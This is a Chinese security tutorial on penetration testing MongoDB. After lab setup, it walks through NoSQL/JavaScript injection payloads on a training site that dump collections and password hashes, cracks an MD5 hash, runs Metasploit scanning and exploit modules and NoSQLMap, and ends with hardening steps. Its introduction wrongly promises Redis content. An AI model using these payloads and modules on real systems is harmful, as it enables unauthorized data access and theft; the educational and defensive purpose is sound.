## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

数据库作为业务平台信息技术的核心和基础，承载着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，数据库的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的数据库中往往储存着等极其重要和敏感的信息。这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

今天会讲解到利用主从复制RCE、本地Redis主从复制RCE反弹shell、SSRF Redis
反弹shell、Redis知识拓展、Redis安全防护等操作，如果连Redis都不会安装操作提权等，怎么进行下一步的研究Redis数据库安全！怎么拿下对方服务器？

## 二、学习Mongo Shell

在前一期中，我们已经看到了对MongoDB及其设置的简要介绍。现在是时候使用Mongo
shell并在MongoDB上执行一些命令来更好了解MongoDB及其工作。

MongoDB使用JavaScript风格的查询，因此我们觉得大部分时间都在运行JavaScript代码。

本节将简要介绍MongoDB的工作原理,并且介绍简单的Mongo shell命令。  
在我们开始之前，有几个术语要理解。

    
    
    • MongoDB 可以有多个数据库.
    • 每个数据库都含有一个或多个集合 “collections”.
    • 每个集合都含有一个或多个文档 “documents”.
    

现在，我们继续运行MongoDB命令。

### 1、MongoDB命令操作

#### 1）创建数据库

如果要创建的数据库名不存在，以下命令将创建一个新的数据库，数据库名已存在会直接使用它。

让我们来创建一个名为”dayudb”的数据库：  
![1626575326_60f391de3c6884001f3c8.png!small?1626575329652](https://image.3001.net/images/20210718/1626575326_60f391de3c6884001f3c8.png!small?1626575329652)

    
    
    use dayudb
    

#### 2）检查当前数据库

我们可以使用命令”db”来检查当前的数据库。 我们运行命令”db”来检查当前的数据库。

![1626575335_60f391e7c50d37b286b8f.png!small?1626575335961](https://image.3001.net/images/20210718/1626575335_60f391e7c50d37b286b8f.png!small?1626575335961)

    
    
    db
    

#### 3）检查数据库列表

“show
dbs”是列出可用数据库的命令,但是这里并没有输出我们刚才创建的testdb数据库，因为它至少需要一个文档，当我们插入一个文档，我们就可以看到列出的数据库。

![1626575341_60f391ed2d53fb008f170.png!small?1626575341486](https://image.3001.net/images/20210718/1626575341_60f391ed2d53fb008f170.png!small?1626575341486)

#### 4）将数据插入集合

这个是把一个数据插入到data集合中。

    
    
    db.data.insert({"user":"test1"})
    

![1626575346_60f391f2936e3783bcca9.png!small?1626575347015](https://image.3001.net/images/20210718/1626575346_60f391f2936e3783bcca9.png!small?1626575347015)

#### 5）查询数据

从MongoDB集合中查询数据，可以使用find()方法。  
让我们查询data集合中的全部文档数据。  
![1626575350_60f391f68f50485188fe8.png!small?1626575351316](https://image.3001.net/images/20210718/1626575350_60f391f68f50485188fe8.png!small?1626575351316)

    
    
    db.data.find()
    

#### 6）在查询数据时写入条件

我们还可以使用MongoDB特定的语法在类似于RDBMS条件的查询中编写条件，让我们来匹配用户名user为test1的数据。

![1626575354_60f391fade3f8bbcff6bb.png!small?1626575356846](https://image.3001.net/images/20210718/1626575354_60f391fade3f8bbcff6bb.png!small?1626575356846)

    
    
    db.data.insert({"dayu":"123456"})
    db.data.insert({"dayu2":"1234567"})
    db.data.insert({"dayu3":"12345678"})
    

#### 7）删除数据

我们可以使用remove()方法根据特定条件从集合中删除文档。让我们来删除用户名user为test3的数据。

![1626575360_60f392007f199ccc7293e.png!small?1626575362189](https://image.3001.net/images/20210718/1626575360_60f392007f199ccc7293e.png!small?1626575362189)

    
    
    db.data.remove({"dayu":"123456"})
    

#### 8）删除集合

我们可以使用drop()方法来删除集合，让我们来删除data集合。  
![1626575364_60f3920440a53e597a459.png!small?1626575364529](https://image.3001.net/images/20210718/1626575364_60f3920440a53e597a459.png!small?1626575364529)

    
    
    show collections;
    db.data.drop()
    show collections;
    

#### 9）删除数据库

我们可以使用db.dropDatabase()删除目前使用的数据库。

![1626575369_60f3920907d2b834c621d.png!small?1626575369441](https://image.3001.net/images/20210718/1626575369_60f3920907d2b834c621d.png!small?1626575369441)

    
    
    db.dropDatabase()
    

### 2、自搭渗透实验环境

熟悉了MongoDB的基本操作之后，接下来我们本地搭建一个Lab实验环境来开始我们的MongoDB数据库渗透测试。

用Kali来模拟现实中的生产机器，安装MongoDB和php web应用程序。

接下来正式开始我们的Lab实验环境搭建，我这里先安装好了LAMP。

**注意: **请使用与我用来创建数据库和集合相同的名称。这是PHP
Web应用程序的工作所必需的。如果您更改这些名称，则可能需要相应地更改PHPWeb应用程序。

#### 1）创建一个新的数据库

![1626575374_60f3920ea942c27684818.png!small?1626575374986](https://image.3001.net/images/20210718/1626575374_60f3920ea942c27684818.png!small?1626575374986)

    
    
    use dayu
    

#### 2）插入数据

把测试数据插入集合”users”和集合”products”

![1626575378_60f39212e40feef50541b.png!small](https://image.3001.net/images/20210718/1626575378_60f39212e40feef50541b.png!small)

    
    
    db.users.insert({"username":"tom","password":"tom","email":"tom@gmail.com","cardnumber":12345})
    db.users.insert({"username":"jim","password":"jim","email":"jim@gmail.com","cardnumber":54321})
    db.users.insert({"username":"bob","password":"bob","email":"bob@gmail.com","cardnumber":22222})
    db.products.insert({"email":"tom@gmail.com","prodname":"laptop","price":"1500USD"})
    db.products.insert({"email":"jim@gmail.com","prodname":"book","price":"50USD"})
    db.products.insert({"email":"bob@gmail.com","prodname":"diamond-ring","price":"4500USD"})
    

#### 3）安装mongo的PHP驱动程序

为了使PHP Web应用程序能够使用MongoDB，我们需要安装PHP驱动程序。

![1626575384_60f39218335c7b929639e.png!small](https://image.3001.net/images/20210718/1626575384_60f39218335c7b929639e.png!small)![1626575387_60f3921b74194eec83365.png!small](https://image.3001.net/images/20210718/1626575387_60f3921b74194eec83365.png!small)报错了！！

    
    
    sudo apt-get install php-pear
    sudo pecl install mongo
    

错误排错：

![1626575391_60f3921f465b8e1176153.png!small?1626575394323](https://image.3001.net/images/20210718/1626575391_60f3921f465b8e1176153.png!small?1626575394323)

    
    
    apt-get install php-mongodb
    

这是我遇到的坑和经验，小伙伴遇到解决即可！

## 三、Mongodb进攻渗透

mongodb默认端口：  
![1626575397_60f39225b108dcfba9709.png!small?1626575398015](https://image.3001.net/images/20210718/1626575397_60f39225b108dcfba9709.png!small?1626575398015)

    
    
    intitle:mongo intext:"listDatabases"
    

简单了解了Mongodb，接下来我们就开始进行渗透进攻！

### 1、注入mongodb

SQL手工注入漏洞测试(MongoDB数据库)

地址：

    
    
    https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe
    

![1626575403_60f3922b3a815e86c69f0.png!small?1626575404941](https://image.3001.net/images/20210718/1626575403_60f3922b3a815e86c69f0.png!small?1626575404941)我们登录该页面进行渗透，该页面是墨者的一个Mongodb的数据库渗透平台。

 **Mongodb语法**

在做之前，先了解下相关语法。Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where，而mongodb是以键值对形式进行查询的

![1626575407_60f3922f0963473c9b0b9.png!small?1626575407402](https://image.3001.net/images/20210718/1626575407_60f3922f0963473c9b0b9.png!small?1626575407402)

因为mongodb的数据储存方式：  
![1626575415_60f392375b3e8ecbb540c.png!small?1626575415690](https://image.3001.net/images/20210718/1626575415_60f392375b3e8ecbb540c.png!small?1626575415690)

具体可以参考菜鸟教程：

    
    
    https://www.runoob.com/mongodb/mongodb-query.html
    

### 2、注入渗透

1）进入环境，单引号' 测试到注入点：  
![1626575420_60f3923c0a9f5ec1d3ec1.png!small?1626575420435](https://image.3001.net/images/20210718/1626575420_60f3923c0a9f5ec1d3ec1.png!small?1626575420435)

    
    
    %27
    

2）查看代码背景  
![1626575438_60f3924e641f13f6db489.png!small?1626575440556](https://image.3001.net/images/20210718/1626575438_60f3924e641f13f6db489.png!small?1626575440556)

3）构造j简单的链接测试回显

![1626575442_60f39252ab7365166a1c4.png!small?1626575443189](https://image.3001.net/images/20210718/1626575442_60f39252ab7365166a1c4.png!small?1626575443189)

    
    
    /new_list.php?id=1'}); return ({title:1,content:'2
    

4）爆库  
![1626575448_60f39258e3c6db50c800b.png!small?1626575449929](https://image.3001.net/images/20210718/1626575448_60f39258e3c6db50c800b.png!small?1626575449929)

    
    
    /new_list.php?id=1'}); return ({title:tojson(db),content:'1
     
     mozhe_cms_Authority
    

db.getCollectionNames()返回的是数组，需要用to json转换为字符串。并且mongodb函数区分大小写！

5）爆表

![1626575453_60f3925d361ff10ffb881.png!small?1626575453920](https://image.3001.net/images/20210718/1626575453_60f3925d361ff10ffb881.png!small?1626575453920)

    
    
    /new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1
    #查询有的集合（集合相当于mysql的表）
    

6）爆字段  
![1626575457_60f392615e136ea75ba7a.png!small?1626575459483](https://image.3001.net/images/20210718/1626575457_60f392615e136ea75ba7a.png!small?1626575459483)  
![1626575461_60f392652a2c5ed7cb68c.png!small?1626575463751](https://image.3001.net/images/20210718/1626575461_60f392652a2c5ed7cb68c.png!small?1626575463751)

    
    
    /new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1
    

db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据

    
    
    ae0b39eef95034e61d6dad338dae60c7
    

7）MD5破解

    
    
    https://www.cmd5.com/
    

![1626575471_60f3926fac5fcf4696ddf.png!small?1626575472046](https://image.3001.net/images/20210718/1626575471_60f3926fac5fcf4696ddf.png!small?1626575472046)

    
    
    dsansda763451
    763451
    

获得密码值！

    
    
    mongo --host 219.153.49.228 -u "mozhe" --authenticationDatabase "mozhe" -p'763451'
    

![1626575476_60f3927498532c5690986.png!small?1626575477647](https://image.3001.net/images/20210718/1626575476_60f3927498532c5690986.png!small?1626575477647)可以通过两种方式登录即可！！

## 四、MSF渗透Mongodb

### 1、未授权验证

MongoDB默认端口27017，当配置成无验证时，存在未授权访问，使用msf中的scanner/mongodb/mongodb_login模块进行测试，使用navicat连接获取数据库中的内容。

    
    
    use auxiliary/scanner/mongodb/mongodb_login
    set rhosts 192.168.90.0/24
    set threads 10
    exploit
    

![1626575482_60f3927ac5df360e28c08.png!small?1626575495184](https://image.3001.net/images/20210718/1626575482_60f3927ac5df360e28c08.png!small?1626575495184)

### 2、exp利用

![1626575487_60f3927f0ea0c6aff0fd6.png!small?1626575495185](https://image.3001.net/images/20210718/1626575487_60f3927f0ea0c6aff0fd6.png!small?1626575495185)

    
    
    use exploit/linux/misc/mongod_native_helper
    set password 123456
    set username dayu
    set rhosts 192.168.253.70
    

那么接着利用渗透即可！

## 五、自动化评估

### 1、简介NoSQLMap

使用自动化方法来查找前面部分提到的所有漏洞。我们将使用一个非常好的工具，称为NoSQLMap。

 **介绍**

NoSQLMap是一个开源的Python工具，用于审计和自动化注入攻击，并利用NoSQL数据库中的缺省配置弱点，以及使用NoSQL的Web应用程序来泄露数据库中的数据。目前，这个工具的漏洞主要集中在MongoDB上，但是在未来的版本中计划对其他基于NoSQL的平台（如CouchDB，Redis和Cassandra）提供额外的支持。

 **特性**

    
    
    • 自动化的MongoDB和CouchDB数据库枚举和克隆攻击。
    • 通过MongoDB Web应用程序提取数据库名称，用户和密码哈希。
    • 使用默认访问和枚举版本扫描MongoDB和CouchDB数据库的子网或IP列表。
    • 使用 强力字典 爆破 MongoDB和CouchDB 的 哈希。
    • 针对MongoClient的PHP应用程序参数注入攻击返回所有数据库记录。
    • Javascript函数变量转义和任意代码注入来返回所有的数据库记录。
    • 基于计时的攻击类似于SQL盲注来验证没有回显信息的Javascript注入漏洞。
    

### 2、下载安装win/linux

下载安装：  
![1626575497_60f39289afd4eea009f98.png!small?1626575501538](https://image.3001.net/images/20210718/1626575497_60f39289afd4eea009f98.png!small?1626575501538)

    
    
    git clone https://github.com/codingo/NoSQLMap.git
    
    python2 setup.py install
    

或者：  
![1626575503_60f3928f149b3b38fc62f.png!small?1626575508310](https://image.3001.net/images/20210718/1626575503_60f3928f149b3b38fc62f.png!small?1626575508310)

    
    
    cd docker
    docker build -t nosqlmap .
    

在或者：  
可以使用Docker-compose运行Nosqlmap：

    
    
    docker-compose build
    docker-compose run nosqlmap
    

windows使用：  
![1626575565_60f392cdb8c5bdde026c1.png!small?1626575567894](https://image.3001.net/images/20210718/1626575565_60f392cdb8c5bdde026c1.png!small?1626575567894)

### 3、运行

下载并安装好NoSQLMap，运行：

![1626575569_60f392d1c9133fbc4a227.png!small?1626575570351](https://image.3001.net/images/20210718/1626575569_60f392d1c9133fbc4a227.png!small?1626575570351)

    
    
    python nosqlmap.py
    
    2-NoSQL数据库访问攻击
    3-NoSQL Web App攻击
    4-扫描以获取匿名MongoDB访问
    

### 4、使用

根据我们的目标，我们可以选择一个合适的选项。 在进行漏洞评估之前，我们需要使用选项1来设置参数。

![1626575575_60f392d70502b556f28ca.png!small?1626575575883](https://image.3001.net/images/20210718/1626575575_60f392d70502b556f28ca.png!small?1626575575883)

    
    
    • 第一个选项是指定目标IP地址。
    • 第二个选项是指定被渗透机WEB应用的地址。
    • 第三个选项是指定可能存在注入的路径。
    • 第四个选项是切换HTTPS。
    • 第五个选项是指定MongoDB的工作端口。
    • 第六个选项是设置HTTP请求模式。
    • 第七个选项是设置本地的IP地址。
    • 第八个选项是设置本地监听端口(MongoDB shell的反弹端口)。
    • ……
    

下面让我们开始实验。我们先需要设置好相关参数。

    
    
    http://x.x.x.228:46744/new_list.php?id=1
    

![1626575581_60f392dd1b6a757aa1374.png!small?1626575590329](https://image.3001.net/images/20210718/1626575581_60f392dd1b6a757aa1374.png!small?1626575590329)

![1626575584_60f392e00ee9f1e60e4e7.png!small?1626575590329](https://image.3001.net/images/20210718/1626575584_60f392e00ee9f1e60e4e7.png!small?1626575590329)

这是实战中渗透Mongodb进入数据库，查看到的勒索情况，目前Mongodb大部分能渗透攻击进入都是在勒索！

## 六、整改加固建议

### 1、方案1：本地监听

如MongoDB只需在本地使用，建议只在本地开启监听服务，使用--bind_ip 127.0.0.1绑定监听地址。

    
    
    $ mongod --bind_ip 127.0.0.1 --dbpath /tmp/test
    

或：在配置文件中指定监听IP，Linux下默认配置文件为/etc/mongod.conf。

    
    
    # network interfaces
    net:
      port: 27017
      bindIp: 127.0.0.1
    

指定配置文件启动

    
    
    mongod --config /etc/mongod.conf
    

3.0及之后版本的MongoDB，监听服务默认在127.0.0.1开启。

### 2、方案2：限制访问源

如果仅对内网服务器提供服务，建议禁止将MongoDB服务发布到互联网上，并在主机上通过防火墙限制访问源IP。

Linux主机，使用iptables进行限制：

    
    
    iptables -A INPUT -s <ip-address> -p tcp --destination-port 27017 -m state --state NEW,ESTABLISHED -j ACCEPT
    iptables -A OUTPUT -d <ip-address> -p tcp --source-port 27017 -m state --state ESTABLISHED -j ACCEPT
    

替换成需访问MongoDB服务的IP；第一条规则允许外部应用访问MongoDB默认服务端口27017，第二条规则允许MongoDB外出流量到达外部应用。Windows主机，可以通过图形管理界面添加防火墙策略或使用netsh命令添加，参考文档：https://docs.mongodb.com/manual/tutorial/configure-windows-netsh-firewall/

### 3、方案3：启动基于角色的登录认证功能

MongoDB支持SCRAM、x.509证书认证等多种认证机制，SCRAM（Salted Challenge Response Authentication
Mechanism）是3.x版本的默认认证机制，该机制通过用户名、密码验证，基于用户角色进行访问控制。下面是添加账号认证的方法：

    
    
    MongoDB 3.0及以上版本启动时添加--auth参数开启认证访问，此时若数据库中无账号，本地登录则无权限进行任何操作，因此需要先以无认证的方式启动服务并创建系统用户管理员账号。 
    

1）以无访问认证的方式启动MongoDB

    
    
    $ mongod --dbpath /data/db
    

2）未开启认证的环境下，登录到数据库

    
    
    $ mongo --host 127.0.0.1 --port 27017
    MongoDB shell version v4.0.8
    connecting to: mongodb://127.0.0.1:27017/test?gssapiServiceName=mongodb
    

3）创建系统用户管理员创建一个用户名为myUserAdmin，密码为Passw0rd的系统用户管理员账号。

    
    
    #切换到admin库：
    > use admin
    switched to db admin
    
    #创建用户
    > db.createUser(
      {
        user: "myUserAdmin",
        pwd: "Passw0rd",
        roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
      }
    )
    
    #创建成功后提示信息：
    Successfully added user: {
        "user" : "myUserAdmin",
        "roles" : [
            {
                "role" : "userAdminAnyDatabase",
                "db" : "admin"
            }
        ]
    }
    

说明：3.0之前版本使用db.addUser方法创建用户。

4）重启MongoDB服务，开启访问认证启动时添加--auth参数

    
    
    $ mongod --auth --port 27017 --dbpath /tmp/test
    

或：在配置文件中添加以下内容，指定配置文件启动服务：

    
    
    #security:
    security:
      authorization: enabled
    

指定配置文件启动MongoDB

    
    
    $ mongod --config /etc/mongod.conf
    

5）使用系统用户管理员账号登录

    
    
    $ mongo --port 27017 -u "myUserAdmin" -p "Passw0rd" --authenticationDatabase "admin"
    

也可以在连接MongoDB是不指定认证信息，连接成功后通过db.auth()方法进行认证：

    
    
    > use admin
    switched to db admin
    > db.auth("myUserAdmin","Passw0rd")
    1  #返回1，表示认证成功
    

6）创建数据库用户创建完系统用户管理员账号并通过系统用户管理员登陆后，对每个库创建指定的用户。下面以对products库创建一个具有读写权限的用户accountUser为例：

    
    
    > use products
    > db.createUser(
       {
         user: "accountUser",
         pwd: "password",
         roles: [ "readWrite", "dbAdmin" ]
       }
    )
    
    #用户创建成功
    Successfully added user: { "user" : "accountUser", "roles" : [ "readWrite", "dbAdmin" ] }
    

7）使用数据库用户访问指定库

    
    
    $ mongo --port 27017 -u "accountUser" -p "password" --authenticationDatabase "products"
    

按照以上多种加固思路进行加固即可！完成公司和企业的数据库安全加固！防止数据泄露和被勒索！

## 七、总结

今天学到了学习Mongo
Shell、自搭渗透实验环境、Mongodb进攻渗透、MSF渗透Mongodb、自动化评估、整改加固建议的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）......
    

接下来在《服务攻防之中间件IIS》会接触到如何进行IIS环境安装、低高版本的渗透等操作，如何提权渗透等方法，请看下篇服务攻防之数据库IIS篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

